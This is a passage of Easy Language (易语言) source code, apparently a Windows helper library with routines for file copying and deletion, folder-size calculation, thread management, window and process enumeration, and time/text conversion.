    赋值 (类型.fFlags, 多项选择 (复制选项, 1021, 1024, 4, 0))
.否则
    赋值 (类型.fFlags, 1021)
.如果结束
返回 (等于 (SHFileOperationA (类型), 0))

.子程序 目录操作_进度复制, 逻辑型, 公开, 可复制文件，也可复制目录。成功返回真，失败返回假。参考了“美女勿进”的代码。
.参数 被复制的文件或目录, 文本型, , 
.参数 复制到的位置, 文本型, , 
.参数 复制选项, 整数型, 可空, 1.#既不提示错误，也不显示进度；2.#不提示错误，显示进度；3.#不显示进度；4.#既提示错误，又显示进度。如果被省略，默认值为 1 。

.局部变量 类型, SHFILEOPSTRUCT, , , 

赋值 (类型.wFunc, 2)
赋值 (类型.pFrom, 相加 (到字节集 (被复制的文件或目录), { 0, 0 }))
赋值 (类型.pTo, 相加 (到字节集 (复制到的位置), { 0, 0 }))
.如果 (并且 (大于 (复制选项, 0), 小于或等于 (复制选项, 4)))
    赋值 (类型.fFlags, 多项选择 (复制选项, 1021, 1024, 4, 0))
.否则
    赋值 (类型.fFlags, 1021)
.如果结束
返回 (等于 (SHFileOperationA (类型), 0))

.子程序 目录操作_进度删除, 逻辑型, 公开, 可删除文件，也可删除目录。成功返回真，失败返回假。
.参数 欲删除的文件或目录, 文本型, , 
.参数 复制选项, 整数型, 可空, 1.#既不提示错误，也不显示进度；2.#不提示错误，显示进度；3.#不显示进度；4.#既提示错误，又显示进度。如果被省略，默认值为 1 。

.局部变量 类型, SHFILEOPSTRUCT, , , 

赋值 (类型.wFunc, 3)
赋值 (类型.pFrom, 相加 (到字节集 (欲删除的文件或目录), { 0, 0 }))
.如果 (并且 (大于 (复制选项, 0), 小于或等于 (复制选项, 4)))
    赋值 (类型.fFlags, 多项选择 (复制选项, 55, 1040, 20, 16)) ' , 位或 (16, 1024) ', 位或 (4, 16),
.否则
    赋值 (类型.fFlags, 55)
.如果结束
返回 (等于 (SHFileOperationA (类型), 0))

.子程序 寻找文件夹_无子文件夹无子文件, 双精度小数型, , 
.参数 文件夹路径数组, 文本型, 参考 数组, 结尾有"\"
.参数 是否处理事件, 逻辑型, , 

.局部变量 文件名, 文本型, , , 
.局部变量 文件大小, 双精度小数型, , , 
.局部变量 临时数组, 文本型, , "0", 
.局部变量 临时数值, 整数型, , , 
.局部变量 i, 整数型, , , 

加入成员 (临时数组, 文件夹路径数组 [1])
.判断开始 (等于 (是否处理事件, 真))
    .循环判断首 ()
        赋值 (文件名, 寻找文件 (相加 (文件夹路径数组 [1], “*.*”), #子目录))
        .判断循环首 (不等于 (文件名, “”))
            .如果真 (并且 (不等于 (文件名, “.”), 不等于 (文件名, “..”)))
                加入成员 (文件夹路径数组, 相加 (文件夹路径数组 [1], 文件名, “\”))
                加入成员 (临时数组, 相加 (文件夹路径数组 [1], 文件名, “\”))
            .如果真结束
            赋值 (文件名, 寻找文件 (#子目录))
             ' 处理事件 ()
        .判断循环尾 ()
        删除成员 (文件夹路径数组, 1, 1)
    .循环判断尾 (大于 (取数组成员数 (文件夹路径数组), 0))
    赋值 (临时数值, 取数组成员数 (临时数组))
    .计次循环首 (临时数值, i)
        赋值 (文件名, 寻找文件 (相加 (临时数组 [i], “*.*”), ))
        .判断循环首 (不等于 (文件名, “”))
            赋值 (文件大小, 相加 (文件大小, 取文件尺寸 (相加 (临时数组 [i], 文件名))))
            赋值 (文件名, 寻找文件 ())
             ' 处理事件 ()
        .判断循环尾 ()
    .计次循环尾 ()
.默认
    .循环判断首 ()
        赋值 (文件名, 寻找文件 (相加 (文件夹路径数组 [1], “*.*”), #子目录))
        .判断循环首 (不等于 (文件名, “”))
            .如果真 (并且 (不等于 (文件名, “.”), 不等于 (文件名, “..”)))
                加入成员 (文件夹路径数组, 相加 (文件夹路径数组 [1], 文件名, “\”))
                加入成员 (临时数组, 相加 (文件夹路径数组 [1], 文件名, “\”))
            .如果真结束
            赋值 (文件名, 寻找文件 (#子目录))
        .判断循环尾 ()
        删除成员 (文件夹路径数组, 1, 1)
    .循环判断尾 (大于 (取数组成员数 (文件夹路径数组), 0))
    赋值 (临时数值, 取数组成员数 (临时数组))
    .计次循环首 (临时数值, i)
        赋值 (文件名, 寻找文件 (相加 (临时数组 [i], “*.*”), ))
        .判断循环首 (不等于 (文件名, “”))
            赋值 (文件大小, 相加 (文件大小, 取文件尺寸 (相加 (临时数组 [i], 文件名))))
            赋值 (文件名, 寻找文件 ())
        .判断循环尾 ()
    .计次循环尾 ()
.判断结束
返回 (文件大小)

.子程序 寻找文件夹_有子文件夹无子文件, 双精度小数型, , 
.参数 文件夹路径数组, 文本型, 参考 数组, 
.参数 子文件夹数量, 整数型, 参考 可空, 
.参数 是否处理事件, 逻辑型, , 

.局部变量 文件名, 文本型, , , 
.局部变量 文件大小, 双精度小数型, , , 
.局部变量 临时数组, 文本型, , "0", 
.局部变量 临时数值, 整数型, , , 
.局部变量 i, 整数型, , , 

加入成员 (临时数组, 文件夹路径数组 [1])
.判断开始 (等于 (是否处理事件, 真))
    .循环判断首 ()
        赋值 (文件名, 寻找文件 (相加 (文件夹路径数组 [1], “*.*”), #子目录))
        .判断循环首 (不等于 (文件名, “”))
            .如果真 (并且 (不等于 (文件名, “.”), 不等于 (文件名, “..”)))
                加入成员 (文件夹路径数组, 相加 (文件夹路径数组 [1], 文件名, “\”))
                加入成员 (临时数组, 相加 (文件夹路径数组 [1], 文件名, “\”))
                赋值 (子文件夹数量, 相加 (子文件夹数量, 1))
            .如果真结束
            赋值 (文件名, 寻找文件 (#子目录))
             ' 处理事件 ()
        .判断循环尾 ()
        删除成员 (文件夹路径数组, 1, 1)
    .循环判断尾 (大于 (取数组成员数 (文件夹路径数组), 0))
    赋值 (临时数值, 取数组成员数 (临时数组))
    .计次循环首 (临时数值, i)
        赋值 (文件名, 寻找文件 (相加 (临时数组 [i], “*.*”), ))
        .判断循环首 (不等于 (文件名, “”))
            赋值 (文件大小, 相加 (文件大小, 取文件尺寸 (相加 (临时数组 [i], 文件名))))
            赋值 (文件名, 寻找文件 ())
             ' 处理事件 ()
        .判断循环尾 ()
    .计次循环尾 ()
.默认
    .循环判断首 ()
        赋值 (文件名, 寻找文件 (相加 (文件夹路径数组 [1], “*.*”), #子目录))
        .判断循环首 (不等于 (文件名, “”))
            .如果真 (并且 (不等于 (文件名, “.”), 不等于 (文件名, “..”)))
                加入成员 (文件夹路径数组, 相加 (文件夹路径数组 [1], 文件名, “\”))
                加入成员 (临时数组, 相加 (文件夹路径数组 [1], 文件名, “\”))
                赋值 (子文件夹数量, 相加 (子文件夹数量, 1))
            .如果真结束
            赋值 (文件名, 寻找文件 (#子目录))
        .判断循环尾 ()
        删除成员 (文件夹路径数组, 1, 1)
    .循环判断尾 (大于 (取数组成员数 (文件夹路径数组), 0))
    赋值 (临时数值, 取数组成员数 (临时数组))
    .计次循环首 (临时数值, i)
        赋值 (文件名, 寻找文件 (相加 (临时数组 [i], “*.*”), ))
        .判断循环首 (不等于 (文件名, “”))
            赋值 (文件大小, 相加 (文件大小, 取文件尺寸 (相加 (临时数组 [i], 文件名))))
            赋值 (文件名, 寻找文件 ())
        .判断循环尾 ()
    .计次循环尾 ()
.判断结束
返回 (文件大小)

.子程序 寻找文件夹_无子文件夹有子文件, 双精度小数型, , 
.参数 文件夹路径数组, 文本型, 参考 数组, 
.参数 子文件数量, 整数型, 参考 可空, 
.参数 是否处理事件, 逻辑型, , 

.局部变量 文件名, 文本型, , , 
.局部变量 文件大小, 双精度小数型, , , 
.局部变量 临时数组, 文本型, , "0", 
.局部变量 临时数值, 整数型, , , 
.局部变量 i, 整数型, , , 

加入成员 (临时数组, 文件夹路径数组 [1])
.判断开始 (等于 (是否处理事件, 真))
    .循环判断首 ()
        赋值 (文件名, 寻找文件 (相加 (文件夹路径数组 [1], “*.*”), #子目录))
        .判断循环首 (不等于 (文件名, “”))
            .如果真 (并且 (不等于 (文件名, “.”), 不等于 (文件名, “..”)))
                加入成员 (文件夹路径数组, 相加 (文件夹路径数组 [1], 文件名, “\”))
                加入成员 (临时数组, 相加 (文件夹路径数组 [1], 文件名, “\”))
            .如果真结束
            赋值 (文件名, 寻找文件 (#子目录))
             ' 处理事件 ()
        .判断循环尾 ()
        删除成员 (文件夹路径数组, 1, 1)
    .循环判断尾 (大于 (取数组成员数 (文件夹路径数组), 0))
    赋值 (临时数值, 取数组成员数 (临时数组))
    .计次循环首 (临时数值, i)
        赋值 (文件名, 寻找文件 (相加 (临时数组 [i], “*.*”), ))
        .判断循环首 (不等于 (文件名, “”))
            赋值 (文件大小, 相加 (文件大小, 取文件尺寸 (相加 (临时数组 [i], 文件名))))
            赋值 (子文件数量, 相加 (子文件数量, 1))
            赋值 (文件名, 寻找文件 ())
             ' 处理事件 ()
        .判断循环尾 ()
    .计次循环尾 ()
.默认
    .循环判断首 ()
        赋值 (文件名, 寻找文件 (相加 (文件夹路径数组 [1], “*.*”), #子目录))
        .判断循环首 (不等于 (文件名, “”))
            .如果真 (并且 (不等于 (文件名, “.”), 不等于 (文件名, “..”)))
                加入成员 (文件夹路径数组, 相加 (文件夹路径数组 [1], 文件名, “\”))
                加入成员 (临时数组, 相加 (文件夹路径数组 [1], 文件名, “\”))
            .如果真结束
            赋值 (文件名, 寻找文件 (#子目录))
        .判断循环尾 ()
        删除成员 (文件夹路径数组, 1, 1)
    .循环判断尾 (大于 (取数组成员数 (文件夹路径数组), 0))
    赋值 (临时数值, 取数组成员数 (临时数组))
    .计次循环首 (临时数值, i)
        赋值 (文件名, 寻找文件 (相加 (临时数组 [i], “*.*”), ))
        .判断循环首 (不等于 (文件名, “”))
            赋值 (文件大小, 相加 (文件大小, 取文件尺寸 (相加 (临时数组 [i], 文件名))))
            赋值 (子文件数量, 相加 (子文件数量, 1))
            赋值 (文件名, 寻找文件 ())
        .判断循环尾 ()
    .计次循环尾 ()
    
.判断结束
返回 (文件大小)

.子程序 寻找文件夹_有子文件夹有子文件, 双精度小数型, , 
.参数 文件夹路径数组, 文本型, 参考 数组, 
.参数 子文件夹数量, 整数型, 参考 可空, 
.参数 子文件数量, 整数型, 参考 可空, 
.参数 是否处理事件, 逻辑型, , 

.局部变量 文件名, 文本型, , , 
.局部变量 文件大小, 双精度小数型, , , 
.局部变量 临时数组, 文本型, , "0", 
.局部变量 临时数值, 整数型, , , 
.局部变量 i, 整数型, , , 

加入成员 (临时数组, 文件夹路径数组 [1])
.判断开始 (等于 (是否处理事件, 真))
    .循环判断首 ()
        赋值 (文件名, 寻找文件 (相加 (文件夹路径数组 [1], “*.*”), #子目录))
        .判断循环首 (不等于 (文件名, “”))
            .如果真 (并且 (不等于 (文件名, “.”), 不等于 (文件名, “..”)))
                加入成员 (文件夹路径数组, 相加 (文件夹路径数组 [1], 文件名, “\”))
                加入成员 (临时数组, 相加 (文件夹路径数组 [1], 文件名, “\”))
                赋值 (子文件夹数量, 相加 (子文件夹数量, 1))
            .如果真结束
            赋值 (文件名, 寻找文件 (#子目录))
             ' 处理事件 ()
        .判断循环尾 ()
        删除成员 (文件夹路径数组, 1, 1)
    .循环判断尾 (大于 (取数组成员数 (文件夹路径数组), 0))
    赋值 (临时数值, 取数组成员数 (临时数组))
    .计次循环首 (临时数值, i)
        赋值 (文件名, 寻找文件 (相加 (临时数组 [i], “*.*”), ))
        .判断循环首 (不等于 (文件名, “”))
            赋值 (文件大小, 相加 (文件大小, 取文件尺寸 (相加 (临时数组 [i], 文件名))))
            赋值 (子文件数量, 相加 (子文件数量, 1))
            赋值 (文件名, 寻找文件 ())
             ' 处理事件 ()
        .判断循环尾 ()
    .计次循环尾 ()
.默认
    .循环判断首 ()
        赋值 (文件名, 寻找文件 (相加 (文件夹路径数组 [1], “*.*”), #子目录))
        .判断循环首 (不等于 (文件名, “”))
            .如果真 (并且 (不等于 (文件名, “.”), 不等于 (文件名, “..”)))
                加入成员 (文件夹路径数组, 相加 (文件夹路径数组 [1], 文件名, “\”))
                加入成员 (临时数组, 相加 (文件夹路径数组 [1], 文件名, “\”))
                赋值 (子文件夹数量, 相加 (子文件夹数量, 1))
            .如果真结束
            赋值 (文件名, 寻找文件 (#子目录))
        .判断循环尾 ()
        删除成员 (文件夹路径数组, 1, 1)
    .循环判断尾 (大于 (取数组成员数 (文件夹路径数组), 0))
    赋值 (临时数值, 取数组成员数 (临时数组))
    .计次循环首 (临时数值, i)
        赋值 (文件名, 寻找文件 (相加 (临时数组 [i], “*.*”), ))
        .判断循环首 (不等于 (文件名, “”))
            赋值 (文件大小, 相加 (文件大小, 取文件尺寸 (相加 (临时数组 [i], 文件名))))
            赋值 (子文件数量, 相加 (子文件数量, 1))
            赋值 (文件名, 寻找文件 ())
        .判断循环尾 ()
    .计次循环尾 ()
.判断结束
返回 (文件大小)

.子程序 目录操作_取文件夹尺寸, 双精度小数型, 公开, 失败返回-1
.参数 文件夹路径, 文本型, , 
.参数 子文件夹数量, 整数型, 参考 可空, 提供变量，保存子文件夹数量
.参数 子文件数量, 整数型, 参考 可空, 提供变量，子文件数量
.参数 是否处理事件, 逻辑型, , 

.局部变量 路径数组, 文本型, , "0", 

.如果真 (大于 (取文本长度 (文件夹路径), 3))
    .如果真 (等于 (寻找文件 (文件夹路径, 相加 (#系统文件, #隐藏文件, #只读文件, #存档文件, #子目录)), “”)) ' 没有此文件或文件夹
        返回 (-1)
    .如果真结束
    .如果真 (等于 (寻找文件 (文件夹路径, #子目录), “”)) ' 如果是文件
        返回 (取文件尺寸 (文件夹路径))
    .如果真结束
    
.如果真结束

加入成员 (路径数组, 文件夹路径)
.如果真 (不等于 (取文本右边 (路径数组 [1], 1), “\”))
    赋值 (路径数组 [1], 相加 (路径数组 [1], “\”))
.如果真结束
.判断开始 (并且 (等于 (是否为空 (子文件夹数量), 真), 等于 (是否为空 (子文件数量), 真)))
    返回 (寻找文件夹_无子文件夹无子文件 (路径数组, 是否处理事件))
.判断 (并且 (等于 (是否为空 (子文件夹数量), 假), 等于 (是否为空 (子文件数量), 真)))
    返回 (寻找文件夹_有子文件夹无子文件 (路径数组, 子文件夹数量, 是否处理事件))
.判断 (并且 (等于 (是否为空 (子文件夹数量), 真), 等于 (是否为空 (子文件数量), 假)))
    返回 (寻找文件夹_无子文件夹有子文件 (路径数组, 子文件数量, 是否处理事件))
.判断 (并且 (等于 (是否为空 (子文件夹数量), 假), 等于 (是否为空 (子文件数量), 假)))
    返回 (寻找文件夹_有子文件夹有子文件 (路径数组, 子文件夹数量, 子文件数量, 是否处理事件))
.默认
    
.判断结束
返回 (-1)

.程序集 多线程程序集, , , 

.子程序 启动线程_, 逻辑型, 公开, 
.参数 欲执行的子程序, 子程序指针, , 
.参数 参数数据, 整数型, 可空, 
.参数 线程句柄, 整数型, 参考 可空, 

.局部变量 句柄, 整数型, , , 

赋值 (句柄, CreateThread (0, 0, 欲执行的子程序, 参数数据, 0, 0))
.如果 (是否为空 (线程句柄))
    CloseHandle (句柄)
.否则
    赋值 (线程句柄, 句柄)
.如果结束
返回 (不等于 (句柄, 0))

.子程序 创建进入许可证_, 多线程许可证, 公开, 
.局部变量 许可证, 多线程许可证, 静态, , 

InitializeCriticalSection (许可证)
返回 (许可证)

.子程序 删除进入许可证_, 空白型, 公开, 
.参数 进入许可证, 多线程许可证, , 

DeleteCriticalSection (进入许可证)

.子程序 进入许可区_, 空白型, 公开, 
.参数 进入许可证, 多线程许可证, , 

EnterCriticalSection (进入许可证)

.子程序 退出许可区_, 空白型, 公开, 
.参数 进入许可证, 多线程许可证, , 

LeaveCriticalSection (进入许可证)

.子程序 等待线程_, 逻辑型, 公开, 
.参数 线程句柄, 整数型, , 
.参数 等待时间, 整数型, 可空, 单位为毫秒，0和-1表示无限等待

返回 (等于 (WaitForSingleObject (线程句柄, 选择 (是否为空 (等待时间), -1, 选择 (等于 (等待时间, 0), -1, 等待时间))), 0))

.子程序 挂起线程_, 逻辑型, 公开, 
.参数 线程句柄, 整数型, , 

返回 (等于 (SuspendThread (线程句柄), 0))

.子程序 继续执行_, 空白型, 公开, 继续运行被挂起的线程
.参数 线程句柄, 整数型, , 

返回 (ResumeThread (线程句柄))

.子程序 取线程返回值_, 整数型, 公开, 使用前请保证线程已经运行完毕，如线程尚未中断将返回STILL_ACTIVE(值为259)。子程序返回值为其他数据类型将返回指针。
.参数 线程句柄, 整数型, , 

.局部变量 返回值, 整数型, , , 

GetExitCodeThread (线程句柄, 返回值)
返回 (返回值)

.子程序 强制结束线程_, 逻辑型, 公开, 
.参数 线程句柄, 整数型, , 

返回 (不等于 (TerminateThread (线程句柄, 0), 0))

.子程序 关闭线程句柄_, 逻辑型, 公开, 
.参数 线程句柄, 整数型, , 

.如果真 (不等于 (GetExitCodeThread (线程句柄, 0), 0))
    返回 (不等于 (CloseHandle (线程句柄), 0))
.如果真结束
返回 (假)

.子程序 子程序1, 空白型, , 


.程序集 核心, , , 

.程序集变量 当前窗口信息, 窗口信息, , "0", 枚举出来的窗口信息
.程序集变量 当前窗口列表, 整数型, , "0", 枚举出来的窗口句柄列表
.子程序 核心_启动线程, 逻辑型, 公开, 
.参数 欲执行的子程序, 子程序指针, , 
.参数 参数数据, 整数型, 可空, 
.参数 线程句柄, 整数型, 参考 可空, 

.局部变量 句柄, 整数型, , , 

赋值 (线程句柄, 0)
赋值 (句柄, CreateThread (0, 0, 欲执行的子程序, 参数数据, 0, 0))
.如果 (是否为空 (线程句柄))
    CloseHandle (句柄)
.否则
    赋值 (线程句柄, 句柄)
.如果结束
返回 (不等于 (句柄, 0))

.子程序 核心_执行, 逻辑型, 公开, 
.参数 文件名, 文本型, , lpFile要打开的网页地址  或 mailo:709760015@qq.com  想用关联程序打印或打开一个程序名或文件名
.参数 命令行参数, 文本型, 可空, lpParameters“”或"0" 如lpszFlie是可执行文件，则这个字串包含传递给执行程序的参数
.参数 窗口显示方式, 整数型, 可空, 默认1,ShowWindow参数 ,0隐藏,1显示,nShowCmd 5或1 定义了如何显示启动程序的常数值。参考ShowWindow函数的nCmdShow参数;

.局部变量 文件, 文本型, , , 
.局部变量 返回, 空白型, , , 

.如果真 (是否为空 (窗口显示方式))
    赋值 (窗口显示方式, 1)
.如果真结束
.如果真 (等于 (倒找文本 (文件名, “\”, , 假), -1))
    赋值 (文件, 相加 (目录操作_取当前目录 (), “\”, 文件名))
.如果真结束
赋值 (返回, ShellExecuteA (0, “open”, 文件, 命令行参数, 文件, 窗口显示方式))
.如果 (等于 (返回, 2))
    返回 (假)
.否则
    返回 (真)
.如果结束


.子程序 核心_延时, 空白型, 公开, 
.参数 时长, 整数型, , ms

Sleep (时长)


.子程序 核心_取命令行, 文本型, 公开, 
返回 (GetCommandLineA ())


.子程序 核心_取启动时间, 整数型, 公开, 
返回 (GetTickCount ())

.子程序 核心_取空闲时间, 整数型, 公开, 
.局部变量 LASTINPUTINFO, 空闲时间, , , 

赋值 (LASTINPUTINFO.Size, 8)
GetLastInputInfo (LASTINPUTINFO)
返回 (相减 (核心_取启动时间 (), LASTINPUTINFO.Time))

.子程序 核心_信息框, 整数型, 公开, 
.参数 提示信息, 文本型, , 
.参数 按钮, 整数型, 可空, 
.参数 窗口标题, 文本型, 可空, 

.如果真 (是否为空 (窗口标题))
    赋值 (窗口标题, “信息：”)
.如果真结束
返回 (相减 (MessageBoxA (GetActiveWindow (), 提示信息, 窗口标题, 按钮), 1))


.子程序 核心_调用子程序, 整数型, 公开, 
.参数 子程序地址, 整数型, , 
.参数 参数, 整数型, 数组, 
.参数 是否为C调用方式, 逻辑型, 可空, 默认为标准调用方式

返回 (CallWindowProcA (#动态调用代码, 子程序地址, 参数, 取数组成员数 (参数), 是否为C调用方式))


.子程序 核心_取颜色值, 整数型, 公开, 
.参数 红色, 整数型, , 数值范围从 0 到 255，表示颜色中的红色成份。
.参数 绿色, 整数型, , 数值范围从 0 到 255，表示颜色中的绿色成份。
.参数 蓝色, 整数型, , 数值范围从 0 到 255，表示颜色中的蓝色成份。

.局部变量 temp, 整数型, , , 
.局部变量 temp1, 整数型, , , 

赋值 (temp, 合并短整数 (位与 (红色, 255), 位与 (绿色, 255)))
赋值 (temp1, 合并整数 (temp, 位与 (蓝色, 255)))

返回 (temp1)


.子程序 核心_取当前窗口, 整数型, 公开, 获得活动窗口的句柄  活动窗口的句柄，如没有窗口处于活动状态，则返回零值
返回 (GetActiveWindow ())

.子程序 核心_取屏幕句柄, 整数型, 公开, 
.局部变量 a, 空白型, , , 

赋值 (a, GetDesktopWindow ())
返回 (a)

.子程序 核心_时间到文本, 文本型, 公开, 将指定时间转换为文本并返回。
.参数 欲转换到文本的时间, 日期时间型, , .

.局部变量 系统时间, 系统时间, , , 

VariantTimeToSystemTime (欲转换到文本的时间, 系统时间)
返回 (相加 (到文本 (系统时间.年), “年”, 到文本 (系统时间.月), “月”, 到文本 (系统时间.日), “日”, 到文本 (系统时间.时), “时”, 到文本 (系统时间.分), “分”, 到文本 (系统时间.秒), “秒”))

.子程序 核心_文本到时间, 日期时间型, 公开, 将指定文本转换到时间日期型，如果格式不符合将出错，将返回100年1月1日。
.参数 文本, 文本型, , 目前只支持“1973年11月15日12时30分25秒”

.局部变量 位置, 整数型, , , 
.局部变量 时间, 日期时间型, , , 
.局部变量 系统时间, 系统时间, , , 

赋值 (系统时间.年, 100)
连续赋值 (1, 系统时间.月, 系统时间.日)
SystemTimeToVariantTime (系统时间, 时间)
.如果真 (不等于 (寻找文本 (文本, “年”, , 假), -1))
    赋值 (系统时间.年, 到整数 (取文本左边 (文本, 相减 (寻找文本 (文本, “年”, , 假), 1))))
    赋值 (位置, 寻找文本 (文本, “月”, , 假))
    .如果 (不等于 (位置, -1))
        赋值 (系统时间.月, 到整数 (取文本中间 (文本, 相加 (寻找文本 (文本, “年”, , 假), 2), 相减 (位置, 1))))
    .否则
        返回 (时间)
    .如果结束
    赋值 (位置, 寻找文本 (文本, “日”, , 假))
    .如果 (不等于 (位置, -1))
        赋值 (系统时间.日, 到整数 (取文本中间 (文本, 相加 (寻找文本 (文本, “月”, , 假), 2), 相减 (位置, 1))))
    .否则
        返回 (时间)
    .如果结束
    赋值 (文本, 取文本右边 (文本, 相减 (取文本长度 (文本), 位置, 1)))
    
    赋值 (位置, 寻找文本 (文本, “时”, , 假))
    .如果真 (不等于 (位置, -1))
        赋值 (系统时间.时, 到整数 (取文本左边 (文本, 相减 (位置, 1))))
        赋值 (位置, 寻找文本 (文本, “分”, , 假))
        .如果真 (不等于 (位置, -1))
            赋值 (系统时间.分, 到整数 (取文本中间 (文本, 相加 (寻找文本 (文本, “时”, , 假), 2), 相减 (位置, 1))))
            赋值 (位置, 寻找文本 (文本, “秒”, , 假))
            .如果真 (不等于 (位置, -1))
                赋值 (系统时间.秒, 到整数 (取文本中间 (文本, 相加 (寻找文本 (文本, “分”, , 假), 2), 相减 (位置, 1))))
            .如果真结束
            
        .如果真结束
        
    .如果真结束
    
.如果真结束
SystemTimeToVariantTime (系统时间, 时间)
返回 (时间)

.子程序 核心_终止进程, 逻辑型, 公开, 
.参数 进程ID, 整数型, , 

.如果 (等于 (TerminateProcess (OpenProcess (2035711, 0, 进程ID), 0), 1))
    返回 (真)
.否则
    返回 (假)
.如果结束


.子程序 核心_取自进程ID, 整数型, 公开, 获取当前进程一个唯一的标识符 GetCurrentProcessId 
.局部变量 返回, 整数型, , , 

赋值 (返回, GetCurrentProcessId ())
返回 (返回)

.子程序 核心_特定目录, 文本型, 公开, 取特定的目录(返回所要取的指定目录名 无效返回空)
.参数 欲获取目录类型, 整数型, 可空, 0我的桌面 1临时目录 5我的文档 6我的收藏夹 7我的启动 11我的开始菜单 20系统字体 36Windows安装目录 37系统目录  [99更多]

.局部变量 路径, 文本型, , , 
.局部变量 标示结构, 项目标识符列表_, , , 
.局部变量 目录类型, 整数型, , , 

.如果真 (等于 (欲获取目录类型, 99))
     ' 输出调试文本 (“0我的桌面 2我的程序 5我的文档 6我的收藏夹 7我的启动 8我最近的文档 9我的发送到 11我的开始菜单 13我的音乐 14我的视频 16我的桌面 20系统字体 22开始菜单组 23程序组 24启动组 25桌面 31收藏夹 32我的浏览器临时目录 33我的Cookies 34我的历史记录 36Windows安装目录 37系统目录 38文件安装目录 39我的图片 40用户目录 41系统目录 46文档 47管理工具 48我的管理工具 53音乐 54图片 55视频”)
.如果真结束
.如果 (等于 (欲获取目录类型, 1))
    赋值 (目录类型, 34)
.否则
    赋值 (目录类型, 欲获取目录类型)
.如果结束

SHGetSpecialFolderLocation (0, 目录类型, 标示结构)
赋值 (路径, 取空白文本 (255))
SHGetPathFromIDListA (标示结构.结构大小, 路径)
.如果真 (等于 (路径, “”))
    返回 (“”)
.如果真结束
.如果真 (等于 (欲获取目录类型, 1))
    赋值 (路径, 子文本替换 (路径, “History”, “Temp”, , , 真))
.如果真结束
返回 (相加 (路径, “\”))

.子程序 核心_枚举窗口, 整数型, 公开, 枚举所有窗口,返回窗口句柄数目,失败返回0 作者:无限复活 [斩月]
.参数 句柄数组, 整数型, 参考 可空 数组, 返回的所有窗口句柄数组

清除数组 (当前窗口列表)
清除数组 (句柄数组)
EnumWindows (&核心_枚举窗口过程, 0)
赋值 (句柄数组, 当前窗口列表)
返回 (取数组成员数 (当前窗口列表))


.子程序 核心_枚举子窗口, 整数型, 公开, 枚举指定句柄的一级子窗口,返回子窗口句柄数目,失败或无子返回0 [斩月]
.参数 父窗口, 整数型, 可空, 指定父窗口句柄  可空:为桌面.找顶级窗口
.参数 子窗口数组, 整数型, 参考 数组, 返回的所有符合条件的子窗口句柄
.参数 类名, 文本型, 可空, 指定子窗口类名

.局部变量 临时, 整数型, , , 

清除数组 (子窗口数组)
赋值 (临时, FindWindowExA (父窗口, 0, 类名, 0))
.判断循环首 (不等于 (临时, 0))
    加入成员 (子窗口数组, 临时)
    赋值 (临时, FindWindowExA (父窗口, 临时, 类名, 0))
.判断循环尾 ()
返回 (取数组成员数 (子窗口数组))

.子程序 核心_枚举窗口过程, 逻辑型, , [斩月]
.参数 hwnd, 整数型, , 

.如果真 (不等于 (hwnd, 0))
    加入成员 (当前窗口列表, hwnd)
    返回 (真)
.如果真结束
返回 (假)

.子程序 核心_枚举窗口信息, 整数型, 公开, 枚举所有可见窗口的句柄的窗口信息(返回数组数目,失败返回0) 作者:无限复活 [斩月]
.参数 临时窗口信息, 窗口信息, 参考 数组, 枚举出来的窗口信息数组

清除数组 (当前窗口信息)
清除数组 (临时窗口信息)
EnumWindows (&核心_窗口信息回调函数, 0)
赋值 (临时窗口信息, 当前窗口信息)
返回 (取数组成员数 (当前窗口信息))


.子程序 核心_窗口信息回调函数, 空白型, , [斩月]
.参数 hwd, 整数型, , 

.局部变量 窗口标题, 文本型, , , 
.局部变量 窗口类名, 文本型, , , 
.局部变量 进程ID, 整数型, , , 
.局部变量 线程ID, 整数型, , , 
.局部变量 临时窗口信息, 窗口信息, , , 

.如果真 (不等于 (IsWindowVisible (hwd), 0)) ' 是否为可见窗口
    赋值 (窗口标题, 取空白文本 (256))
    赋值 (窗口类名, 取空白文本 (256))
    GetWindowTextA (hwd, 窗口标题, 255)
    GetClassNameA (hwd, 窗口类名, 255)
    赋值 (线程ID, GetWindowThreadProcessId (hwd, 进程ID))
    赋值 (临时窗口信息.进程ID, 进程ID)
    赋值 (临时窗口信息.线程ID, 线程ID)
    赋值 (临时窗口信息.窗口句柄, hwd)
    赋值 (临时窗口信息.窗口类名, 窗口类名)
    赋值 (临时窗口信息.窗口标题, 窗口标题)
    加入成员 (当前窗口信息, 临时窗口信息)
.如果真结束


.子程序 核心_枚举进程, 整数型, 公开, 失败返回0，成功返回进程数量(该命令为高级成员命令) 作者:无限复活 [斩月]
.参数 进程信息, 进程信息_, 参考 可空 数组, 返回的进程信息 数组

.局部变量 信息, 进程信息_, , , 
.局部变量 进程快照, 整数型, , , 
.局部变量 进程句柄, 整数型, , , 

清除数组 (进程信息)
赋值 (进程快照, CreateToolhelp32Snapshot (15, 0))
.如果真 (等于 (进程快照, 0))
    返回 (0)
.如果真结束
赋值 (信息.结构大小, 1024)
赋值 (进程句柄, Module32First (进程快照, 信息))
.判断循环首 (不等于 (进程句柄, 0))
    加入成员 (进程信息, 信息)
    赋值 (进程句柄, Module32Next (进程快照, 信息))
.判断循环尾 ()
CloseHandle (进程快照)
返回 (取数组成员数 (进程信息))

.子程序 核心_域名取IP, 文本型, 公开, 根据指定的机器名取IP地址。失败返回空。本命令为超级命令。
.参数 域名, 文本型, , 要取得IP地址的机器名。

.局部变量 WSAD, WSADATA, , , 
.局部变量 lpHost, 整数型, , , 
.局部变量 HOST, HOSTENT, , , 
.局部变量 dwIPAddr, 整数型, , , 
.局部变量 tmpIPAddr, 字节型, , "0", 
.局部变量 i, 整数型, , , 
.局部变量 sIPAddr, 文本型, , , 

.如果真 (等于 (WSAStartup (514, WSAD), 0))
    赋值 (lpHost, gethostbyname (域名))
    .如果真 (不等于 (lpHost, 0))
        RtlMoveMemory_HOSTENT (HOST, lpHost, 16)
        RtlMoveMemory_读整数 (dwIPAddr, HOST.hAddrList, 4)
        重定义数组 (tmpIPAddr, 假, HOST.hLen)
        RtlMoveMemory_字节型 (tmpIPAddr, dwIPAddr, HOST.hLen)
        .计次循环首 (HOST.hLen, i)
            .如果 (等于 (i, HOST.hLen))
                赋值 (sIPAddr, 相加 (sIPAddr, 到文本 (tmpIPAddr [i])))
            .否则
                赋值 (sIPAddr, 相加 (sIPAddr, 到文本 (tmpIPAddr [i]), “.”))
            .如果结束
            
        .计次循环尾 ()
    .如果真结束
    
.如果真结束

WSACleanup ()
返回 (sIPAddr)

.子程序 核心_取当前目录, 文本型, 公开, 
.局部变量 长度, 整数型, , , 
.局部变量 路径, 文本型, , , 

赋值 (长度, GetCurrentDirectoryA (长度, 路径))
